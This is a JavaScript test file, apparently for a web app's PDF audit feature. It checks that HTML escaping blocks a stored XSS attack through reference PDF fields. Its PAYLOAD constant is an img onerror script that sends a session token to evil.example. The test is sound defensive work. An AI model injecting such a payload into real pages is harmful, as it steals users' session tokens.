import { describe, it, expect } from 'bun:test';
import { readFileSync } from 'fs';
import { resolve } from 'path';
import { escapeHtml } from '../public/js/core/utils.js';

const PAYLOAD = '<img src=x onerror="fetch(\'https://evil.example/\'+sessionStorage.getItem(\'rubble_token\'))">';

describe('PDF Audit - XSS escaping (stored XSS via reference PDF fields)', () => {
  const auditJs = readFileSync(resolve(import.meta.dir, '../public/js/pdf-audit/audit.js'), 'utf-8');

  it('escapeHtml neutralizes the PDF-field XSS payload', () => {
    const escaped = escapeHtml(PAYLOAD);
    // Tag e atributos ficam inertes: sem '<' cru e sem aspas cruas.
    expect(escaped).not.toMatch(/<img/);
    expect(escaped).not.toContain('"');
    expect(escaped).toContain('&lt;img');
    expect(escaped).toContain('&quot;');
  });

  it('showReferencePreview escapes i.value in the reference fields list', () => {
    // O ponto exato do stored XSS: `${i.value || '-'}` sem escape.
    // Enquanto nao houver escapeHtml(i.value, o teste falha.
    expect(auditJs).toMatch(/escapeHtml\(\s*i\.value\s*\|\|?\s*'?-?'?\s*\)/);
  });

  it('nok items escape secao and numero (defense in depth)', () => {
    expect(auditJs).toMatch(/escapeHtml\(\s*(String\()?i\.secao/);
    expect(auditJs).toMatch(/escapeHtml\(\s*(String\()?i\.numero/);
  });

  it('router.js loads the pdf-audit view (regression guard for empty branch)', () => {
    const routerJs = readFileSync(resolve(import.meta.dir, '../public/js/router.js'), 'utf-8');
    expect(routerJs).toContain('hash === "#/pdf-audit"');
    expect(routerJs).toContain('/app/Views/pdf-audit/audit.html?v=');
    expect(routerJs).toContain('initPdfAudit()');
  });
});
